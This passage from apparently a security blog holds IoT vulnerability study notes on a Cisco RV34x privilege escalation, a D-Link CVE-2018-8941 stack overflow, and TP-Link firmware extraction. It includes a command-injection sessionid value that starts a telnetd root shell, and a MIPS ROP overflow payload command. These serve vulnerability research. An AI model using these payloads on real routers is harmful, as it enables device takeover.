class="variable">$log</span> == 1) &#123;</span><br><span class="line">							system(<span class="string">"logger"</span>,<span class="string">"-t VPN-timer"</span>,<span class="string">"Message read: <span class="variable">$message</span>"</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						my <span class="variable">$temp</span>=substr(<span class="variable">$message</span>,1,);</span><br><span class="line">						<span class="comment">#print "$temp\n"; #contains connection name</span></span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (index(substr(<span class="variable">$message</span>,0,1),<span class="string">"+"</span>) == 0)&#123;</span><br><span class="line">					        <span class="comment">#print "It is for ADD\n";</span></span><br><span class="line">							<span class="comment">#Now, check if it is for TVPNC or S2S.</span></span><br><span class="line">							my <span class="variable">$isTVPNC</span>=`uci get strongswan.<span class="variable">$temp</span>`;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>怎么在http中直接提权，有引号，会干扰</p>
<p>  <code>sessionid=&#39;|python -c &#39;from socket import *;socket(AF_INET, SOCK_DGRAM).sendto(&quot;+;/usr/sbin/telnetd -p 2324 -l /bin/sh&amp;&quot;,(&quot;127.0.0.1&quot;, 9999))&#39;|&#39;;</code></p>
</li>
<li><p>怎么找到这个进程的？</p>
</li>
<li><p>直接监听的9999，并非是特定的nginx或cgi与他通信，谁跟他发都行</p>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.iot-inspector.com/blog/advisory-cisco-rv34x-series-privilege-escalation-vpntimer/" target="_blank" rel="noopener">https://www.iot-inspector.com/blog/advisory-cisco-rv34x-series-privilege-escalation-vpntimer/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link RCE即CVE-2018-8941漏洞分析</title>
    <url>/2021/05/10/iot/D-Link%20RCE%E5%8D%B3CVE-2018-8941%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="D-Link-RCE即CVE-2018-8941漏洞分析"><a href="#D-Link-RCE即CVE-2018-8941漏洞分析" class="headerlink" title="D-Link RCE即CVE-2018-8941漏洞分析"></a>D-Link RCE即CVE-2018-8941漏洞分析</h2><ul>
<li><p>burp抓本地包失败，将127改为本机IP</p>
</li>
<li><p>tcapi set会调用Libtcapi.so.1中的tcapi_set函数（怎么知道的？</p>
</li>
<li><p>python语句与bash命令结合</p>
<ul>
<li>python -c “print(‘A’*12+’BBBB’)”（-c后双引号跟命令</li>
<li>cat <code>python -c &quot;print(&#39;A&#39;*12+&#39;BBBB&#39;)&quot;</code>（用尖引号</li>
<li>cat $(python -c “print(‘A’*12+’BBBB’)”)（用dollar</li>
</ul>
</li>
<li><p>运行tcapi</p>
<ul>
<li>一定保证fat运行bin，否则connection error</li>
<li>形式：sudo chroot . ./qemu-mips-static -g 1234 ./userfs/bin/tcapi set Diagnostics_Entry Addr <code>python -c &quot;print(&#39;A&#39;*596+&#39;BBBB&#39;)&quot;</code></li>
</ul>
</li>
<li><p>Crash的时候，eip为42424242，s0-3均是41414141，因此，这五者可控</p>
</li>
<li><p>找gadget</p>
<ul>
<li>由于本身文件很小，可能不太好找到合适的gadget，而Libc里面的gadget比较多</li>
<li>readelf 判断程序的依赖库，readelf -d ./userfs/bin/tcapi（dynamic动态库</li>
<li>mips下的rop主要是去找到 move t9,xxx;jalrt9这样的指令来达到控制执行流程的目的，</li>
<li>其中xxx是我们在溢出的时候可以控制的寄存器。此漏洞中我们可以控制s0,s1,s2,s3 寄存器。</li>
<li>用misprop插件在IDA 搜索godget，直接搜索从栈中读取参数到寄存器的godget，mipsrop.stackfinders()</li>
<li>（mac下mipsrop插件有时会失败</li>
</ul>
</li>
<li><p>mips函数调用栈结构（从高到低</p>
<ul>
<li>t临时寄存器</li>
<li>a参数寄存器（必要时</li>
<li>参数（大于4个</li>
<li>ra返回地址</li>
<li>s保存寄存器</li>
<li>局部变量</li>
<li>（因此，ra被控制时，s0-3也可控</li>
</ul>
</li>
<li><p>一个gadget就搞定</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-24-094519.png" alt="image-20200524102251188"></p>
<p>  把栈中的参数放到s5，再直接放到a0作为下一个call参数，</p>
<p>  把system的地址从s0传到t9</p>
<p>  看到s5=sp+0×10，那么在payload中ra的后面16字节后再放我们需要system执行的参数</p>
</li>
<li><p>构造exp</p>
<ul>
<li>寻找libc基址：gdb中vmmap，得0x7671b000</li>
<li>寻找system地址：readelf -s ./lib/libc.so.0 | grep system，得到00059bb0（+libc = 76774bb0，</li>
<li>gadget地址：0x1656c（+libc = 7673156c</li>
<li>sudo chroot . ./qemu-mips-static ./userfs/bin/tcapi set Diagnostics_Entry Addr <code>python -c &quot;print &#39;A&#39;*580+&#39;\x76\x77\x4b\xb0&#39;+&#39;B&#39;*12+&#39;\x76\x73\x17\x08&#39;+&#39;C&#39;*24+&#39;ls&#39; &quot;</code></li>
<li>（思路正确但实测失败、python -c后要有引号、\x的16进制也要引号、python中单双引号同，不是c中单引号字符，双引号字符串</li>
</ul>
</li>
<li><p>给qemu 加上-strace参数，可以看系统调用（尽管此法获取基址失败</p>
</li>
<li><p>（思路、各种地址都正确，但实测失败，why？？？）</p>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://xz.aliyun.com/t/6607" target="_blank" rel="noopener">https://xz.aliyun.com/t/6607</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>TP-Link wr886nv6固件分析</title>
    <url>/2021/05/09/iot/TP-Link%20wr886nv6%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="TP-Link-wr886nv6固件分析"><a href="#TP-Link-wr886nv6固件分析" class="headerlink" title="TP-Link wr886nv6固件分析"></a>TP-Link wr886nv6固件分析</h1><h2 id="00-准备"><a href="#00-准备" class="headerlink" title="00-准备"></a>00-准备</h2><ul>
<li>binwalk固件</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 除了前3外，其余都是lzma压缩过的数据</span></span><br><span class="line"><span class="comment"># 偏移0xa200处uncompressed size: 2365008 bytes,最大，猜测其可能包含一些有用的数据</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12656         0x3170          U-Boot version string, <span class="string">"U-Boot 1.1.4 (May  8 2016 - 07:42:47)"</span></span><br><span class="line">12704         0x31A0          CRC32 polynomial table, big endian</span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span></span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line">791104        0xC1240         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 1731 bytes</span><br></pre></td></tr></table></figure>
<ul>
<li>binwalk 进一步 a200//here</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 猜测是路由器主程序（怎么判定的？</span></span><br><span class="line"><span class="comment"># vxwork主程序：集成了httpd等多种二进制的程序，vxworks = 主程序 + web文件 + kernel + uboot</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk a200-3</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1846404       0x1C2C84        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1853692       0x1C48FC        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1898688       0x1CF8C0        VxWorks operating system version <span class="string">"5.5.1"</span> , compiled: <span class="string">"Sep 20 2017, 09:16:35"</span></span><br><span class="line">1955289       0x1DD5D9        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/wbuf_private.h, line 279</span><br><span class="line">1955524       0x1DD6C4        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/wbuf_private.h, line 365</span><br><span class="line">1964105       0x1DF849        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/osdep.h, line 1525</span><br><span class="line">1967556       0x1E05C4        Copyright string: <span class="string">"Copyright(C) 2001-2011 by TP-LINK TECHNOLOGIES CO., LTD."</span></span><br><span class="line">1997244       0x1E79BC        VxWorks WIND kernel version <span class="string">"2.6"</span></span><br><span class="line">2042360       0x1F29F8        HTML document header</span><br><span class="line">2042425       0x1F2A39        HTML document footer</span><br><span class="line">2062192       0x1F7770        PEM certificate</span><br><span class="line">2062248       0x1F77A8        PEM RSA private key</span><br><span class="line">2071532       0x1F9BEC        Base64 standard index table</span><br><span class="line">2106544       0x2024B0        CRC32 polynomial table, big endian</span><br><span class="line">2107568       0x2028B0        CRC32 polynomial table, big endian</span><br><span class="line">2108592       0x202CB0        CRC32 polynomial table, big endian</span><br><span class="line">2109616       0x2030B0        CRC32 polynomial table, big endian</span><br><span class="line">2130316       0x20818C        XML document, version: <span class="string">"1.0"</span></span><br><span class="line">2149736       0x20CD68        SHA256 <span class="built_in">hash</span> constants, big endian</span><br><span class="line">2247821       0x224C8D        StuffIt Deluxe Segment (data): f</span><br><span class="line">2247852       0x224CAC        StuffIt Deluxe Segment (data): fError</span><br><span class="line">2247933       0x224CFD        StuffIt Deluxe Segment (data): f</span><br><span class="line">2364653       0x2414ED        Unix path: /2/3/4/5/6</span><br></pre></td></tr></table></figure>
<h2 id="01-vxworks主程序"><a href="#01-vxworks主程序" class="headerlink" title="01-vxworks主程序"></a>01-vxworks主程序</h2><h3 id="1-1-定位"><a href="#1-1-定位" class="headerlink" title="1-1-定位"></a>1-1-定位</h3><ul>
<li>firmware中那么多section，哪个是？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 binwalk -Me，信息最多</span></span><br><span class="line">Scan Time:     2021-01-11 17:31:44</span><br><span class="line">Target File:   /home/lxl/Desktop/tmp/_wr886nv6.bin.extracted/A200</span><br><span class="line">MD5 Checksum:  3b45621ea1615616a548c79e971f3ad7</span><br><span class="line">Signatures:    344</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1846404       0x1C2C84        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1853692       0x1C48FC        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1898688       0x1CF8C0        VxWorks operating system version <span class="string">"5.5.1"</span> , compiled: <span class="string">"Sep 20 2017, 09:16:35"</span></span><br><span class="line">1955289       0x1DD5D9        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/wbuf_private.h, line 279</span><br><span class="line">1955524       0x1DD6C4        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/wbuf_private.h, line 365</span><br><span class="line">1964105       0x1DF849        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/osdep.h, line 1525</span><br><span class="line">1967556       0x1E05C4        Copyright string: <span class="string">"Copyright(C) 2001-2011 by TP-LINK TECHNOLOGIES CO., LTD."</span></span><br><span class="line">1997244       0x1E79BC        VxWorks WIND kernel version <span class="string">"2.6"</span></span><br><span class="line">2042360       0x1F29F8        HTML document header</span><br><span class="line">2042425       0x1F2A39        HTML document footer</span><br><span class="line">2062192       0x1F7770        PEM certificate</span><br><span class="line">2062248       0x1F77A8        PEM RSA private key</span><br><span class="line">2071532       0x1F9BEC        Base64 standard index table</span><br><span class="line">2106544       0x2024B0        CRC32 polynomial table, big endian</span><br><span class="line">2107568       0x2028B0        CRC32 polynomial table, big endian</span><br><span class="line">2108592       0x202CB0        CRC32 polynomial table, big endian</span><br><span class="line">2109616       0x2030B0        CRC32 polynomial table, big endian</span><br><span class="line">2130316       0x20818C        XML document, version: <span class="string">"1.0"</span></span><br><span class="line">2149736       0x20CD68        SHA256 <span class="built_in">hash</span> constants, big endian</span><br><span class="line">2247821       0x224C8D        StuffIt Deluxe Segment (data): f</span><br><span class="line">2247852       0x224CAC        StuffIt Deluxe Segment (data): fError</span><br><span class="line">2247933       0x224CFD        StuffIt Deluxe Segment (data): f</span><br><span class="line">2364653       0x2414ED        Unix path: /2/3/4/5/6</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 tree，提取后东西也最多</span></span><br><span class="line">├── _A200.extracted</span><br><span class="line">│   ├── 1C2C84.crt</span><br><span class="line">│   ├── 1C48FC.crt</span><br><span class="line">│   ├── 1F29F8</span><br><span class="line">│   ├── 1F7770.crt</span><br><span class="line">│   ├── 1F77A8.key</span><br><span class="line">│   ├── 20818C.xml</span><br><span class="line">│   ├── 224C8D.sit</span><br><span class="line">│   ├── 224CAC.sit</span><br><span class="line">│   └── 224CFD.sit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 binwalk + firmware时，所有lzma压缩过的数据中，size最大</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 综上，firmware中A200为主程序</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-提取"><a href="#1-2-提取" class="headerlink" title="1-2-提取"></a>1-2-提取</h3><ul>
<li>dd提取并解压a200</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 binwalk确定偏移、大小</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 skip=在firmware中的偏移=41472=0xA200，count=749643=791104-41472</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=wr886nv6.bin of=a200.lzma bs=1 skip=41472 count=749632  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 解压失败</span></span><br><span class="line"><span class="comment"># unlzma等同于lzma -d</span></span><br><span class="line"><span class="comment"># 其实win下的7zip是可以的，可忽略尾部的垃圾数据（尽管提示“有效数据外包含额外数据”）</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ unlzma -d a200.lzma </span><br><span class="line">unlzma: a200.lzma: Compressed data is corrupt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 hexdump看a200，注意到：MINIFS字符串，并且前面全是ff</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump a200.lzma -C |tail</span><br><span class="line">000b6290  39 30 5a fb 6f 5c 65 63  97 42 d1 69 e3 13 e5 ba  |90Z.o\ec.B.i....|</span><br><span class="line">000b62a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. <span class="string">'...d...x.|</span></span><br><span class="line"><span class="string">000b62b0  be 68 ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |.h..............|</span></span><br><span class="line"><span class="string">000b62c0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">000b7000  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|</span></span><br><span class="line"><span class="string">000b7010  00 00 00 02 00 00 00 86  00 01 f4 00 00 07 55 7c  |..............U||</span></span><br><span class="line"><span class="string">000b7020  92 1c 64 4e ae 88 d9 d2  2d b4 48 ce 5c eb 69 51  |..dN....-.H.\.iQ|</span></span><br><span class="line"><span class="string">000b7030  00 00 04 8d 00 00 00 20  00 00 06 c3 00 00 00 00  |....... ........|</span></span><br><span class="line"><span class="string">000b7040</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 5 去掉minifs部分，仍失败（749568 = 0x000b7000）</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ dd if=a200.lzma of=a200-2.lzma bs=1 skip=0 count=749568</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ hexdump a200-2.lzma -C |tail</span></span><br><span class="line"><span class="string">000b6250  59 eb fd 7d 1b ba e1 f7  8e 80 97 5a 47 ac 2d 76  |Y..&#125;.......ZG.-v|</span></span><br><span class="line"><span class="string">000b6260  7a 5a 92 5a 70 b8 44 e1  fb 68 0c ea 65 44 66 39  |zZ.Zp.D..h..eDf9|</span></span><br><span class="line"><span class="string">000b6270  40 b2 28 ee 1c 99 d2 42  15 34 2a cb 1d 47 1a b5  |@.(....B.4*..G..|</span></span><br><span class="line"><span class="string">000b6280  50 0f 17 65 1f ee 46 eb  f9 ca c2 13 29 11 9a fe  |P..e..F.....)...|</span></span><br><span class="line"><span class="string">000b6290  39 30 5a fb 6f 5c 65 63  97 42 d1 69 e3 13 e5 ba  |90Z.o\ec.B.i....|</span></span><br><span class="line"><span class="string">000b62a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. '</span>...d...x.|</span><br><span class="line">000b62b0  be 68 ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |.h..............|</span><br><span class="line">000b62c0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">000b7000</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ unlzma a200-2.lzma </span><br><span class="line">unlzma: a200-2.lzma: Compressed data is corrupt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 再去掉ff部分，成功</span></span><br><span class="line"><span class="comment"># （746162 = 0x000b62b0 + 2），要+2，因为count从1，而hexdump从0开始</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=a200.lzma of=a200-3.lzma bs=1 skip=0 count=746162</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump a200-3.lzma -C |tail</span><br><span class="line">000b6230  f4 15 97 db 1c 72 79 dc  b0 91 d9 ac 36 85 2f 41  |.....ry.....6./A|</span><br><span class="line">000b6240  50 <span class="built_in">fc</span> 24 f5 c5 d0 b5 63  32 0c 00 d2 f5 97 d7 33  |P.$....c2......3|</span><br><span class="line">000b6250  59 eb fd 7d 1b ba e1 f7  8e 80 97 5a 47 ac 2d 76  |Y..&#125;.......ZG.-v|</span><br><span class="line">000b6260  7a 5a 92 5a 70 b8 44 e1  fb 68 0c ea 65 44 66 39  |zZ.Zp.D..h..eDf9|</span><br><span class="line">000b6270  40 b2 28 ee 1c 99 d2 42  15 34 2a cb 1d 47 1a b5  |@.(....B.4*..G..|</span><br><span class="line">000b6280  50 0f 17 65 1f ee 46 eb  f9 ca c2 13 29 11 9a fe  |P..e..F.....)...|</span><br><span class="line">000b6290  39 30 5a fb 6f 5c 65 63  97 42 d1 69 e3 13 e5 ba  |90Z.o\ec.B.i....|</span><br><span class="line">000b62a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. <span class="string">'...d...x.|</span></span><br><span class="line"><span class="string">000b62b0  be 68                                             |.h|</span></span><br><span class="line"><span class="string">000b62b2</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ unlzma a200-3.lzma </span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ ls</span></span><br><span class="line"><span class="string">a200-2.lzma  a200-3  a200.lzma  wr886nv6.bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 7 其实，直接用win下的7zip就可，会自动忽略尾部的垃圾数据（尽管提示“有效数据外包含额外数据”）</span></span><br><span class="line"><span class="string"># 当然，binwalk -e也可</span></span><br></pre></td></tr></table></figure>
<h3 id="1-3-判定架构"><a href="#1-3-判定架构" class="headerlink" title="1-3-判定架构"></a>1-3-判定架构</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 -Y参数看架构，mips，大端</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk -Y a200-3 </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">672           0x2A0           MIPS executable code, 32/64-bit, big endian, at least 845 valid instructions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 uImage header中为mips、CRC32中为big endian（同一个固件中，主程序与这两者的架构信息应该可对应）</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12656         0x3170          U-Boot version string, <span class="string">"U-Boot 1.1.4 (May  8 2016 - 07:42:47)"</span></span><br><span class="line">12704         0x31A0          CRC32 polynomial table, big endian<span class="comment"># big endian</span></span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span><span class="comment"># CPU: MIPS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 综上，mips，大端</span></span><br></pre></td></tr></table></figure>
<h3 id="1-4-确定基址（未找到"><a href="#1-4-确定基址（未找到" class="headerlink" title="1-4-确定基址（未找到"></a>1-4-确定基址（未找到</h3><h4 id="解压主程序的程序"><a href="#解压主程序的程序" class="headerlink" title="解压主程序的程序"></a>解压主程序的程序</h4><ul>
<li>找到解压主程序的boot程序-36ac</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主程序a200是lzma压缩的，运行时肯定会有另一个程序来解压它</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binwalk看firmware，有一个uImage header，其image name: "u-boot image"，这只是一个header文件，其主体文件肯定在后面那一堆lzma数据中</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binwalk -Me，36AC的描述，可断定其为u-boot程序（对应前面的header），其来解压主程序a200</span></span><br><span class="line">Scan Time:     2021-01-11 17:31:44</span><br><span class="line">Target File:   /home/lxl/Desktop/tmp/_wr886nv6.bin.extracted/36AC</span><br><span class="line">MD5 Checksum:  a26046acdb2729cde979b969d2f33a56</span><br><span class="line">Signatures:    344</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">44976         0xAFB0          U-Boot version string, <span class="string">"U-Boot 1.1.4 (May  8 2016 - 07:42:44)"</span></span><br><span class="line">45248         0xB0C0          CRC32 polynomial table, big endian</span><br></pre></td></tr></table></figure>
<ul>
<li>dd提取并解压出boot程序</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 同上a200的解压：直接7zip或去除尾部垃圾后unlzma</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binwalk找偏移</span></span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尾部有垃圾数据，解压失败（skip=36ac的偏移，count=41472-13996</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=wr886nv6.bin of=36ac.lzma bs=1 skip=13996 count=27476</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ unlzma 36ac.lzma </span><br><span class="line">unlzma: 36ac.lzma: Compressed data is corrupt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看尾部垃圾（可看出，同样有ff，但不同于a200，没有minifs字符串</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump 36ac.lzma -C | tail -n 30</span><br><span class="line">000050a0  f1 2a 48 66 e5 dd 1d 11  06 2a 34 6c c8 a1 3a 7e  |.*Hf.....*4l..:~|</span><br><span class="line">000050b0  62 f7 9e ba 50 ef d1 fb  48 1f 19 c9 df 48 de bb  |b...P...H....H..|</span><br><span class="line">000050c0  07 8a 2c 82 b6 8d 4f 1f  90 94 f1 5b 29 d3 bf aa  |..,...O....[)...|</span><br><span class="line">000050d0  6e dc 84 93 5d d7 45 b2  a6 ae b0 da 5a 09 43 00  |n...].E.....Z.C.|</span><br><span class="line">000050e0  cf 45 f4 72 95 0e 4b b8  e1 <span class="built_in">cd</span> 1b 18 f6 2d 05 f6  |.E.r..K......-..|</span><br><span class="line">000050f0  29 8d 5d 0c fe 44 14 15  87 15 35 4c dc f3 86 0e  |).]..D....5L....|</span><br><span class="line">00005100  82 20 23 60 a4 66 0d 3c  ed 29 88 d6 ce d6 df 05  |. <span class="comment">#`.f.&lt;.)......|</span></span><br><span class="line">00005110  c7 94 31 a2 5e f3 52 35  0f 87 f8 88 08 1b 3f f8  |..1.^.R5......?.|</span><br><span class="line">00005120  05 30 7c 4a f3 7f be a3  ec 8e b1 55 f2 3f 65 76  |.0|J.......U.?ev|</span><br><span class="line">00005130  db 8c 59 4b ff ff ff ff  ff ff ff ff ff ff ff ff  |..YK............|</span><br><span class="line">00005140  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">00006950  ff ff ff ff 00 00 01 00  55 aa 9d d1 a8 c8 83 31  |........U......1|</span><br><span class="line">00006960  c9 69 fb bf bc f0 d4 32  70 c7 aa 55 80 00 10 00  |.i.....2p..U....|</span><br><span class="line">00006970  80 00 10 00 00 00 00 00  00 00 00 09 00 00 00 00  |................|</span><br><span class="line">00006980  00 02 00 00 00 02 00 00  00 00 08 00 00 02 08 00  |................|</span><br><span class="line">00006990  00 00 08 00 00 02 10 00  00 00 70 00 00 02 80 00  |..........p.....|</span><br><span class="line">000069a0  00 00 9e 00 00 03 1e 00  00 00 02 00 00 03 20 00  |.............. .|</span><br><span class="line">000069b0  00 0b 62 b2 00 0e 90 00  00 07 55 9c 00 00 00 00  |..b.......U.....|</span><br><span class="line">000069c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">000069e0  00 00 00 00 bf cc fd 9a  46 ff f6 15 <span class="built_in">cd</span> 6c 25 07  |........F....l%.|</span><br><span class="line">000069f0  51 e0 e9 b9 85 d8 28 30  f3 f8 36 b3 c5 90 11 d9  |Q.....(0..6.....|</span><br><span class="line">00006a00  58 25 c2 05 8d f8 94 d0  64 75 c4 9d 68 a4 ab 91  |X%......du..h...|</span><br><span class="line">00006a10  ee 3a 3d 72 4d 79 46 69  72 6d 77 61 72 65 00 00  |.:=rMyFirmware..|</span><br><span class="line">00006a20  00 00 00 01 5f 21 b3 de  0a 18 0d ac 96 78 6f 23  |...._!.......xo<span class="comment">#|</span></span><br><span class="line">00006a30  57 b5 ae 3f 00 00 00 00  00 00 00 00 00 00 00 00  |W..?............|</span><br><span class="line">00006a40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00006b54</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除尾部垃圾后，成功（20778=0x5130+4，并非+3，因为hexdump中从0开始）</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=36ac.lzma of=36ac-2.lzma bs=1 skip=0 count=20788</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ unlzma 36ac-2.lzma </span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ ls</span><br><span class="line">36ac-2  36ac.lzma  a200-3  a200.lzma  binwalk-Me.txt  wr886nv6.bin  _wr886nv6.bin.extracted</span><br></pre></td></tr></table></figure>
<ul>
<li>ida加载uboot程序-36ac</li>
</ul>
